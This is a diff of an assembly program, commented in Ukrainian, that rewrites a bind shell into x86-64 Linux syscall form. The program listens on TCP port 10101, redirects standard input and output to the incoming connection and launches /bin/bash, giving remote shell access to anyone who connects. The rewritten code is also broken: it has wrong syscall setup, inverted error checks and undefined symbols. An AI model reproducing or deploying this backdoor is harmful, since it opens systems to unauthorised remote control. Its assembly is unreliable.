@@ -1,59 +1,138 @@
-.section .bss
-  sin: .space 12  
+/* .data section */
+.data
 
-.section .data
-  sock: .long 0    
-  fd: .long 0    
+sock: .long 0
+fd: .long 0
 
-.section .text
-  .global main
+/* .bss section */
+.bss
+
+sin: .long 0, 0, 0
+
+/* .text section */
+.text
+
+.globl main
 
 main:
-    push AF_INET
-    push SOCK_STREAM
-    push IPPROTO_TCP
-    call socket
-    mov sock, eax
+    /* Створення TCP-сокета */
+    mov $AF_INET, %eax
+    mov $SOCK_STREAM, %ebx
+    mov $IPPROTO_TCP, %ecx
+    syscall
 
-    mov eax, AF_INET
-    mov [sin + 0], eax
-    mov eax, 10101
-    call htons
-    mov [sin + 4], eax
-    mov eax, 0
-    mov [sin + 8], eax
+    /* Перевірка результату */
+    mov %eax, sock
 
-    mov eax, sock
-    mov ebx, sin
-    mov ecx, 12
-    call bind
+    test %eax, %eax
+    jne .error_socket
 
-    mov eax, sock
-    mov ecx, 1
-    call listen
+    /* Заповнення структури sockaddr_in */
+    movw $AF_INET, sin_family
 
-    mov eax, sock
-    mov ebx, NULL
-    mov ecx, NULL
-    call accept
-    mov fd, eax
+    /* htons(10101) */
+    movw $10101, %ax
+    xchgb %ah, %al
+    movw %ax, sin_port
 
-    mov eax, fd
-    mov ebx, 0
-    call dup2
+    /* Прив'язка сокета до адреси */
+    mov $SYS_BIND, %rax
+    movq sock, %rdi
+    movq $sin, %rsi
+    movq $0x10, %rdx
+    syscall
 
-    mov eax, fd
-    mov ebx, 1
-    call dup2
+    /* Перевірка результату */
+    mov %eax, sock
 
-    mov eax, fd
-    mov ebx, 2
-    call dup2
+    test %eax, %eax
+    jne .error_bind
 
-    mov ebx, [esp + 4]
-    push 0
-    call execve
+    /* Прослуховування сокета */
+    mov $SYS_LISTEN, %rax
+    movq sock, %rdi
+    mov $1, %rdx
+    syscall
 
-    mov eax, 1
-    mov ebx, 0
-    int 80
+    /* Перевірка результату */
+    mov %eax, sock
+
+    test %eax, %eax
+    jne .error_listen
+
+    /* Прийняття з'єднання */
+    mov $SYS_ACCEPT, %rax
+    movq sock, %rdi
+    mov $0, %rsi
+    mov $0, %rdx
+    syscall
+
+    /* Перевірка результату */
+    mov %eax, fd
+
+    test %eax, %eax
+    jne .error_accept
+
+    /* Дублювання дескрипторів файлів */
+    mov $SYS_DUP2, %rax
+    movq fd, %rdi
+    mov $0, %rsi
+    syscall
+
+    mov $SYS_DUP2, %rax
+    movq fd, %rdi
+    mov $1, %rsi
+    syscall
+
+    mov $SYS_DUP2, %rax
+    movq fd, %rdi
+    mov $2, %rsi
+    syscall
+
+    /* Запуск /bin/bash */
+    mov $SYS_EXECVE, %rax
+    mov $bash, %rdi
+    mov $0, %rsi
+    mov $0, %rdx
+    syscall
+
+.error_socket:
+    mov $1, %eax
+    mov $str_error_socket, %edi
+    syscall
+
+    jmp .exit
+
+.error_bind:
+    mov $1, %eax
+    mov $str_error_bind, %edi
+    syscall
+
+    jmp .exit
+
+.error_listen:
+    mov $1, %eax
+    mov $str_error_listen, %edi
+    syscall
+
+    jmp .exit
+
+.error_accept:
+    mov $1, %eax
+    mov $str_error_accept, %edi
+    syscall
+
+    jmp .exit
+
+.exit:
+    mov $SYS_EXIT, %rax
+    mov $0, %rdi
+    syscall
+
+/* Рядки помилок */
+.data
+
+str_error_socket: .string "Помилка створення сокета\n"
+str_error_bind: .string "Помилка прив'язки сокета\n"
+str_error_listen: .string "Помилка при прослуховуванні сокета\n"
+str_error_accept: .string "Помилка прийняття з'єднання\n"
